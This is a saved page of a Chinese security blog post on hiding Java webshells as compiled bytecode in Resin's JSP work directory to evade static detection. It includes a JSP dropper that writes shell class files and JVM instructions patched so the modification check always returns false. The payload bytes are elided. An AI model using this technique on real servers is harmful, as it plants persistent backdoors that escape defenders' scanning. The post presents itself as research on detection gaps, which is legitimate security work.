@@ -1,0 +1,500 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>利用Java Binary Webshell对抗静态检测 &#8211; KINGX</title>
+<meta name="description" content="Java Webshell Hidden in JSP Pages">
+<meta name="keywords" content="java, webshell, servlet">
+
+<!-- Twitter Cards -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kingx.me/images/">
+<meta name="twitter:title" content="利用Java Binary Webshell对抗静态检测">
+<meta name="twitter:description" content="Java Webshell Hidden in JSP Pages">
+<meta name="twitter:creator" content="@https://example.com">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用Java Binary Webshell对抗静态检测">
+<meta property="og:description" content="Java Webshell Hidden in JSP Pages">
+<meta property="og:url" content="https://kingx.me/Java-Webshell-Hidden-in-JSP-Pages.html">
+<meta property="og:site_name" content="KINGX">
+
+
+
+
+
+<link rel="canonical" href="https://kingx.me/Java-Webshell-Hidden-in-JSP-Pages.html">
+<link href="https://kingx.me/feed.xml" type="application/atom+xml" rel="alternate" title="KINGX Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="https://kingx.me/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- Load Modernizr -->
+<script src="https://kingx.me/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="https://kingx.me/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="https://kingx.me/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="https://kingx.me/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://kingx.me/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://kingx.me/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://kingx.me/images/apple-touch-icon-144x144-precomposed.png">
+
+
+
+
+<style type="text/css">body {background-image:url(https://kingx.me/images/triangular.png);}</style>
+
+
+</head>
+
+<body id="post" >
+
+<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
+	<button class="dl-trigger">Open Menu</button>
+	<ul class="dl-menu">
+		<li><a href="https://kingx.me/">Home</a></li>
+		<li>
+			<a href="#">About</a>
+			<ul class="dl-submenu">
+				<li>
+					<img src="https://kingx.me/images/avatar.jpg" alt="KINGX photo" class="author-photo">
+					<h4>KINGX</h4>
+					<p>What is Security</p>
+				</li>
+				<li><a href="https://kingx.me/about/"><span class="btn btn-inverse">Learn More</span></a></li>
+				<li>
+					<a href="mailto:root#kingx.me"><i class="fa fa-fw fa-envelope"></i> Email</a>
+				</li>
+				<li>
+					<a href="https://example.com"><i class="fa fa-fw fa-twitter"></i> Twitter</a>
+				</li>
+				<li>
+					<a href="http://example.com"><i class="fa fa-fw fa-weibo"></i> Weibo</a>
+				</li>
+				
+				
+				
+				<li>
+					<a href="https://example.com"><i class="fa fa-fw fa-github"></i> GitHub</a>
+				</li>
+				
+				
+				
+				
+			</ul><!-- /.dl-submenu -->
+		</li>
+		<!-- <li>
+			<a href="#">Posts</a>
+			<ul class="dl-submenu">
+				<li><a href="https://kingx.me/posts/">All Posts</a></li>
+				<li><a href="https://kingx.me/tags/">All Tags</a></li>
+			</ul>
+		</li> -->
+		
+	    
+	    <li><a href="https://kingx.me/latest-events/" >Security Incidents</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/latest-vulns/" >Vulnerabilities</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/pentest-tools/" >Red Team</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/posts/" >Archives</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/tags/" >Tags</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/links/" >Links</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/feed.xml" >RSS</a></li>
+	  
+	</ul><!-- /.dl-menu -->
+</nav><!-- /.dl-menuwrapper -->
+
+
+
+
+<div id="main" role="main">
+  <article class="hentry">
+    <header class="header-title">
+      <div class="header-title-wrap">
+        
+          <h1 class="entry-title"><a href="https://kingx.me/Java-Webshell-Hidden-in-JSP-Pages.html" rel="bookmark" title="利用Java Binary Webshell对抗静态检测">利用Java Binary Webshell对抗静态检测</a></h1>
+        
+        <h2><span class="entry-date date published"><time datetime="2016-05-02T00:00:00-04:00">May 02, 2016</time></span></h2>
+        
+        <p class="entry-reading-time">
+          <i class="fa fa-clock-o"></i>
+          
+Reading time ~1 minute
+          
+          <span id="busuanzi_container_page_pv">
+             / Page View <span id="busuanzi_value_page_pv">0</span> / Site Visitor <span id="busuanzi_value_site_uv">0</span>
+          </span>
+          
+        </p><!-- /.entry-reading-time -->
+        
+
+      </div><!-- /.header-title-wrap -->
+    </header>
+    <div class="entry-content">
+      <span class="entry-tags" style="color:red;font-size:13px;margin-bottom: 0px;">「声明：本博客中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。」</span>
+      <h2 id="0x01-背景">0x01 背景</h2>
+
+<p>Webshell一般是指以服务端动态脚本形式存在的一种网页后门。在入侵检测的过程中，检测Webshell无疑是一大重点。比较常见的检测手法有：</p>
+
+<ol>
+  <li>文件内容检测（静态检测）</li>
+  <li>文件行为检测（动态检测）</li>
+  <li>网络异常流量分析</li>
+  <li>……</li>
+</ol>
+
+<p>其中，静态检测是比较简单有效的检测Webshell的手段之一。根据Webshell的文件特征建立异常模型，并使用大量的Webshell样本对模型进行训练，通过诸如异常函数、关键代码以及文件内容与普通业务代码的相似度等等关键点来进行分析检测。</p>
+
+<p>然而在笔者工作中却发现，如果Webshell脱离了服务端脚本页面形式的存在，基于文件特征的静态检测又将面临怎样的困境？我们不妨一起来看看。</p>
+
+<h2 id="0x02-javaweb应用">0x02 JavaWeb应用</h2>
+
+<p>在Java Web应用中，Servlet是Java语言实现的一个接口，用于编写服务端程序<sup id="fnref:1"><a href="#fn:1" class="footnote">1</a></sup>。Servlet程序代码会预先编译成.class文件，部署在Java容器中，响应用户各种协议的请求，大多数情况下基于HTTP协议，包括动态生成网页内容等等。但是Servlet由Java代码编写，不能有效地区分页面的展示和处理逻辑，导致Servlet代码非常混乱，而用Java服务器页面（JSP）的出现，可以让程序员把展现层和数据层很好的区分管理起来。</p>
+
+<p>JSP作为HttpServlet的扩展，使用HTML的书写格式，在适当的地方加入Java代码片段，从而动态生成页面内容。JSP在首次被访问时，JSP应用容器(应用服务器中用于管理Java组件的部分)将其转换为Java Servlet代码，并编译成.class字节码文件并执行。而下次该JSP文件被访问时，服务器将直接调用Servlet进行处理，除非JSP文件被修改。</p>
+
+<p>比如，在Apache Tomcat中，它提供了一个Jasper编译器用以将JSP编译成对应的Servlet。在JSP文件被访问后，在workDir生成对应的servlet源码与编译后的.class字节码文件。</p>
+
+<p><img src="https://kingx.me/images/articles/201605/tomcat-work-dir.png" alt="tomcat-work-dir" /></p>
+
+<p>JSP编译生成的.class文件默认存放在<code class="highlighter-rouge">$CATALINA_BASE/work</code>下，存放路径也可以通过Server.xml等配置文件中的Host标签的workDir属性进行配置<sup id="fnref:2"><a href="#fn:2" class="footnote">2</a></sup>：</p>
+
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"> 
+<span class="nt">&lt;Host</span> <span class="na">appBase=</span><span class="s">"webapps"</span> <span class="na">autoDeploy=</span><span class="s">"true"</span> <span class="na">name=</span><span class="s">"localhost"</span> <span class="na">unpackWARs=</span><span class="s">"true"</span> 
+    <span class="na">workDir=</span><span class="s">"/home/tomcat_run_user/other_work_dir"</span><span class="nt">&gt;</span>
+
+....
+
+<span class="nt">&lt;/Host&gt;</span></code></pre></figure>
+
+<p><strong>JSP文件再次被访问时，Tomcat会直接调用已编译好的字节码文件。当文件被修改，Tomcat会重新解析JSP文件，生成Servlet代码并编译执行。当文件被删除时，Tomcat返回<code class="highlighter-rouge">404 Not Found</code>。</strong></p>
+
+<p><img src="https://kingx.me/images/articles/201605/tomcat-404.png" alt="tomcat-404" /></p>
+
+<p>而在在配置文件<code class="highlighter-rouge">$CATALINA_BASE/conf/web.xml</code>中，当Jasper运行在开发模式下时，我们可以配置modificationTestInterval参数，控制Tomcat在一定时间之内不检查JSP文件的修改状态<sup id="fnref:3"><a href="#fn:3" class="footnote">3</a></sup>。</p>
+
+<p>设想，如果可以关闭Java容器对JSP文件修改状态的检查，是否可以将恶意代码存放在workDir的.class字节码中，并通过JSP形式持久访问？</p>
+
+<h2 id="0x03-resin">0x03 Resin</h2>
+
+<p>我们注意到了另一款非常流行且性能优良的企业级应用服务器——Resin。Resin同样提供了Servlet和JSP运行引擎。</p>
+
+<p>可以看到默认情况下，初次访问JSP后，Resin会在./WEB-INF/work/_jsp目录下生成Servlet源码和编译后的.class字节码文件。</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">└── webapps
+    └── ROOT
+        ├── index.jsp
+        └── WEB-INF
+            ├── classes
+            ├── tmp
+            ├── web.xml
+            └── work
+                └── _jsp
+                    ├── _index__jsp.class
+                    ├── _index__jsp.java
+                    ├── _index__jsp.java.smap
+                    └── _index__jsp<span class="nv">$TagState</span>.class</code></pre></figure>
+
+<p>与Apache Tomcat不同的是，<strong>Resin生成并编译Servlet之后，可以在JSP文件被删除的情况下，正常提供访问。</strong>
+查看Resin生成的JSP对应的Servlet源码发现，生成的代码内包含了检查JSP文件修改状态相关方法：<code class="highlighter-rouge">_caucho_isModified()</code>。</p>
+
+<p>我们来看看这部分源码中的关键逻辑:</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">_index__jsp</span> <span class="kd">extends</span> <span class="n">com</span><span class="o">.</span><span class="na">caucho</span><span class="o">.</span><span class="na">jsp</span><span class="o">.</span><span class="na">JavaPage</span>
+<span class="o">{</span>
+  <span class="kd">private</span> <span class="kt">boolean</span> <span class="n">_caucho_isDead</span><span class="o">;</span>
+  <span class="kd">private</span> <span class="kt">boolean</span> <span class="n">_caucho_isNotModified</span><span class="o">;</span>
+
+  <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">_caucho_setNeverModified</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">isNotModified</span><span class="o">)</span>
+  <span class="o">{</span>
+    <span class="n">_caucho_isNotModified</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+  <span class="o">}</span>
+
+  <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">_caucho_isModified</span><span class="o">()</span>
+  <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">_caucho_isDead</span><span class="o">)</span>
+      <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+
+    <span class="k">if</span> <span class="o">(</span><span class="n">_caucho_isNotModified</span><span class="o">)</span>
+      <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+
+    <span class="k">if</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">caucho</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">CauchoSystem</span><span class="o">.</span><span class="na">getVersionId</span><span class="o">()</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">8002497470487589159L</span><span class="o">)</span>
+      <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+
+    <span class="k">return</span> <span class="n">_caucho_depends</span><span class="o">.</span><span class="na">isModified</span><span class="o">();</span>
+  <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">caucho</span><span class="o">.</span><span class="na">vfs</span><span class="o">.</span><span class="na">Path</span> <span class="n">appDir</span><span class="o">)</span>
+    <span class="kd">throws</span> <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">ServletException</span>
+  <span class="o">{</span>
+    <span class="o">...</span>
+    <span class="n">depend</span> <span class="o">=</span> <span class="k">new</span> <span class="n">com</span><span class="o">.</span><span class="na">caucho</span><span class="o">.</span><span class="na">vfs</span><span class="o">.</span><span class="na">Depend</span><span class="o">(</span><span class="n">appDir</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"index.jsp"</span><span class="o">),</span> <span class="o">-</span><span class="mi">122100326514986033L</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+    <span class="n">_caucho_depends</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">depend</span><span class="o">);</span>
+    <span class="n">loader</span><span class="o">.</span><span class="na">addDependency</span><span class="o">(</span><span class="n">depend</span><span class="o">);</span>
+  <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span>
+  <span class="o">{</span>
+      <span class="n">_caucho_isDead</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+      <span class="kd">super</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span>
+    <span class="o">...</span>
+  <span class="o">}</span>
+
+  <span class="o">...</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>Servlet启动时，Resin会调用init()方法，结束时会调用destroy()方法<sup id="fnref:4"><a href="#fn:4" class="footnote">4</a></sup>。init()方法中实例化的Depend类用于检查文件修改，
+这里调用的Depend构造函数中，第三个参数标志了在JSP文件被删除的情况下的处理逻辑。</p>
+
+<p><code class="highlighter-rouge">public Depend(Path source, long digest, boolean requireSource)</code></p>
+
+<p>requireSource为True时，如果JSP文件被删除则服务器返回404。默认为false，所以当已编译的JSP文件被删除时，Resin并不会判定该JSP页面被修改，依然会执行对应的字节码。</p>
+
+<p>可以看到，Resin判断一个JSP文件是否修改的逻辑为</p>
+
+<p><img src="https://kingx.me/images/articles/201605/is_modified.png" alt="is_modified" /></p>
+
+<p>当web.xml中配置autoCompile属性为false时，Resin会关闭对JSP文件的自动编译，调用_caucho_setNeverModified()方法，从而不会检查JSP文件修改状态。</p>
+
+<p>web.xml</p>
+
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;web-app&gt;</span>
+        <span class="nt">&lt;jsp</span> <span class="na">auto-compile=</span><span class="s">"false"</span><span class="nt">&gt;&lt;/jsp&gt;</span>
+<span class="nt">&lt;/web-app&gt;</span></code></pre></figure>
+
+<h2 id="0x04-binary-jsp-webshell">0x04 Binary JSP Webshell</h2>
+
+<p>由于Resin这些特性，我们可以用JSP将Webshell字节码写入对应的路径下，即可得到一个二进制形式存在的JSP Webshell。这个Resin自动编译存放的代码目录路径可以通过<code class="highlighter-rouge">&lt;work-dir&gt;</code>标签自定义配置，默认为<code class="highlighter-rouge">WEB-INF/work</code>目录<sup id="fnref:5"><a href="#fn:5" class="footnote">5</a></sup>。如：</p>
+
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;host</span> <span class="na">id=</span><span class="s">"test.com.cn"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;web-app</span> <span class="na">id=</span><span class="s">"/"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;app-dir&gt;</span>pathto\test<span class="nt">&lt;/app-dir&gt;</span>
+<span class="nt">&lt;work-dir&gt;</span>pathto\WEB-INF\work_sc<span class="nt">&lt;/work-dir&gt;</span>
+<span class="nt">&lt;temp-dir&gt;</span>pathto\WEB-INF\tmp_sc<span class="nt">&lt;/temp-dir&gt;</span>
+......
+<span class="nt">&lt;/web-app&gt;</span> 
+<span class="nt">&lt;/host&gt;</span></code></pre></figure>
+
+<p>如：默认配置下，利用JSP写入二进制字节码Webshell：</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java">    <span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="kn">import</span><span class="err">="</span><span class="nn">java.io.*</span><span class="s">" %&gt;
+    &lt;%
+    FileOutputStream file_out=new FileOutputStream("</span><span class="o">./</span><span class="n">webapps</span><span class="o">/</span><span class="n">ROOT</span><span class="o">/</span><span class="n">WEB</span><span class="o">-</span><span class="n">INF</span><span class="o">/</span><span class="n">work</span><span class="o">/</span><span class="n">_jsp</span><span class="o">/</span><span class="n">_comm__jsp</span><span class="o">.</span><span class="na">class</span><span class="s">");   
+    FileOutputStream file_out_tag=new FileOutputStream("</span><span class="o">./</span><span class="n">webapps</span><span class="o">/</span><span class="n">ROOT</span><span class="o">/</span><span class="n">WEB</span><span class="o">-</span><span class="n">INF</span><span class="o">/</span><span class="n">work</span><span class="o">/</span><span class="n">_jsp</span><span class="o">/</span><span class="n">_comm__jsp$TagState</span><span class="o">.</span><span class="na">class</span><span class="err">"</span><span class="o">);</span>  
+
+    <span class="kt">byte</span><span class="o">[]</span> <span class="n">_jsp_class</span> <span class="o">=</span> <span class="o">{(</span><span class="kt">byte</span><span class="o">)</span><span class="mh">0xca</span><span class="o">,(</span><span class="kt">byte</span><span class="o">)</span><span class="mh">0xfe</span><span class="o">,(</span><span class="kt">byte</span><span class="o">)</span><span class="mh">0xba</span><span class="o">,......};</span>
+    <span class="kt">byte</span><span class="o">[]</span> <span class="n">_jsp_tag_class</span> <span class="o">=</span> <span class="o">{(</span><span class="kt">byte</span><span class="o">)</span><span class="mh">0xca</span><span class="o">,(</span><span class="kt">byte</span><span class="o">)</span><span class="mh">0xfe</span><span class="o">,(</span><span class="kt">byte</span><span class="o">)</span><span class="mh">0xba</span><span class="o">,(</span><span class="kt">byte</span><span class="o">)</span><span class="mh">0xbe</span><span class="o">,......};</span>
+
+    <span class="n">file_out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">_jsp_class</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">_jsp_class</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+    <span class="n">file_out_tag</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">_jsp_tag_class</span><span class="o">,</span><span class="mi">0</span><span class="o">,</span><span class="n">_jsp_tag_class</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+
+    <span class="n">file_out</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+    <span class="n">file_out_tag</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+    <span class="o">%&gt;</span></code></pre></figure>
+
+<p>利用脚本中Webshell的字节码内容可以在本地Resin服务器环境中编译获得，但是由于编译和运行的Resin版本不一致会被判定JSP文件已修改，从而被重新编译，这不是我们想看到的。如0x03小节中所说，Resin中判断JSP是否修改的逻辑包含在JSP对应的Servlet代码中，于是我们可以篡改这部分字节码中的逻辑，使得<code class="highlighter-rouge">_caucho_isModified()</code>函数永远返回false，JVM指令如下：</p>
+
+<figure class="highlight"><pre><code class="language-jvm" data-lang="jvm">aload_0
+getfield _jsp/_comm__jsp/_caucho_isDead Z
+ifeq 6
+iconst_0
+ireturn
+aload_0
+getfield _jsp/_comm__jsp/_caucho_isNotModified Z
+ifeq 11
+iconst_0
+ireturn
+invokestatic com/caucho/server/util/CauchoSystem/getVersionId()J
+ldc2_w 431137076814425723
+lcmp
+ifeq 17
+iconst_0
+ireturn
+aload_0
+getfield _jsp/_comm__jsp/_caucho_depends Lcom/caucho/make/DependencyContainer;
+iconst_0
+ireturn</code></pre></figure>
+
+<p>测试效果如下：利用write_binary_shell.jsp文件，将字节码webshell写入对应的目录下，即可通过访问对应的JSP文件来访问Webshell。
+由于篡改了相关的判断逻辑，无论Web是否存在同名JSP文件，Resin依然会优先解析到该字节码Webshell。</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">├── webapps
+│   └── ROOT
+│       ├── index.jsp
+│       ├── WEB-INF
+│       │   ├── classes
+│       │   ├── tmp
+│       │   ├── web.xml
+│       │   └── work
+│       │       └── _jsp
+│       │           ├── _comm__jsp.class
+│       │           └── _comm__jsp<span class="nv">$TagState</span>.class
+│       └── write_binary_shell.jsp</code></pre></figure>
+
+<p><img src="https://kingx.me/images/articles/201605/poc.png" alt="poc" /></p>
+
+<h2 id="0x05-references">0x05 References</h2>
+
+<div class="footnotes">
+  <ol>
+    <li id="fn:1">
+      <p>https://zh.wikipedia.org/wiki/Java_Servlet <a href="#fnref:1" class="reversefootnote">&#8617;</a></p>
+    </li>
+    <li id="fn:2">
+      <p>https://tomcat.apache.org/tomcat-8.0-doc/config/host.html <a href="#fnref:2" class="reversefootnote">&#8617;</a></p>
+    </li>
+    <li id="fn:3">
+      <p>https://tomcat.apache.org/tomcat-8.0-doc/jasper-howto.html <a href="#fnref:3" class="reversefootnote">&#8617;</a></p>
+    </li>
+    <li id="fn:4">
+      <p>http://www.caucho.com/resin-3.1/doc/servlet.xtp <a href="#fnref:4" class="reversefootnote">&#8617;</a></p>
+    </li>
+    <li id="fn:5">
+      <p>http://www.caucho.com/resin-4.0/admin/config-el-ref.xtp#work-dir <a href="#fnref:5" class="reversefootnote">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+      <footer class="entry-meta">
+        <span class="entry-tags" style="color:black;font-size:13px;margin-bottom: 0px;">欢迎订阅我的微信公众号</span>
+        <img src="/images/secengine.jpg" alt="welcome subscribe"/>
+        <span class="entry-tags"><a href="https://kingx.me/tags/#java" title="Pages tagged java" class="tag"><span class="term">java</span></a><a href="https://kingx.me/tags/#webshell" title="Pages tagged webshell" class="tag"><span class="term">webshell</span></a><a href="https://kingx.me/tags/#servlet" title="Pages tagged servlet" class="tag"><span class="term">servlet</span></a></span>
+        
+        <div class="social-share">
+  <ul class="socialcount socialcount-small inline-list">
+    <li class="weibo"><a href="http://service.weibo.com/share/share.php?title=分享KINGX的文章《利用Java Binary Webshell对抗静态检测》&url=https://kingx.me/Java-Webshell-Hidden-in-JSP-Pages.html&source=bookmark" title="Share on Weibo" target="_blank"><span class="count"><i class="fa fa-weibo"></i> WEIBO</span></a></li>
+    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=https://kingx.me/Java-Webshell-Hidden-in-JSP-Pages.html" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
+    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=https://kingx.me/Java-Webshell-Hidden-in-JSP-Pages.html" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
+    <li class="googleplus"><a href="https://plus.google.com/share?url=https://kingx.me/Java-Webshell-Hidden-in-JSP-Pages.html" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
+  </ul>
+</div><!-- /.social-share -->
+<!--
+<div class="ds-share" data-thread-key="/Java-Webshell-Hidden-in-JSP-Pages" data-title="利用Java Binary Webshell对抗静态检测" data-images="" data-content="利用Java Binary Webshell对抗静态检测" data-url="https://kingx.me/Java-Webshell-Hidden-in-JSP-Pages.html">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+        <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+</div>
+-->
+      </footer>
+    </div><!-- /.entry-content -->
+    
+    
+
+    <div class="read-more">
+  
+    <div class="read-more-header">
+      
+        <a href="https://kingx.me/commons-collections-java-deserialization.html" class="read-more-btn">Read More</a>
+      
+    </div><!-- /.read-more-header -->
+    <div class="read-more-content">
+      
+      <h3><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" title="如何绕过高版本JDK的限制进行JNDI注入利用">如何绕过高版本JDK的限制进行JNDI注入利用</a></h3>
+      <p>Restrictions of JNDI Manipulation RCE & Bypass <a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">Continue reading</a></p>
+      
+    </div><!-- /.read-more-content -->
+  
+  <div class="read-more-list">
+    
+      
+      <div class="list-item">
+        <h4><a href="https://kingx.me/Thinking-about-Red-Teaming.html" title="【红蓝对抗】大型互联网企业安全蓝军建设">【红蓝对抗】大型互联网企业安全蓝军建设</a></h4>
+        <span>Published on March 12, 2019</span>
+      </div><!-- /.list-item -->
+      
+    
+      
+      <div class="list-item">
+        <h4><a href="https://kingx.me/CobaltStrike-Patch.html" title="内网渗透有它就够了，手把手教你分析CobaltStrike3.12">内网渗透有它就够了，手把手教你分析CobaltStrike3.12</a></h4>
+        <span>Published on November 19, 2018</span>
+      </div><!-- /.list-item -->
+      
+    
+  </div><!-- /.read-more-list -->
+</div><!-- /.read-more -->
+  </article>
+</div><!-- /#main -->
+
+<div class="footer-wrapper">
+  <footer role="contentinfo">
+    <span>&copy; 2019 KINGX. Powered by Jekyll using the HPSTR Theme.</span>
+  </footer>
+</div><!-- /.footer-wrapper -->
+
+<!--<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>-->
+<!-- <script src="http://libs.baidu.com/jquery/1.9.1/jquery.min.js"></script> -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="https://kingx.me/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script src="https://kingx.me/assets/js/scripts.min.js"></script>
+
+
+
+
+<script>
+
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  if(location.host=="kingx.me"){
+    hm.src = "https://hm.baidu.com/hm.js?d11d8512e0bc6992b9c9bbf2d266ce31";
+  }else if(location.host=="kingx.sinaapp.com"){
+    hm.src = "https://hm.baidu.com/hm.js?d1b3dbd97b73868454f102755fdf51ba";
+  }
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Busuanzi Analytics -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+	        
+
+</body>
+</html>
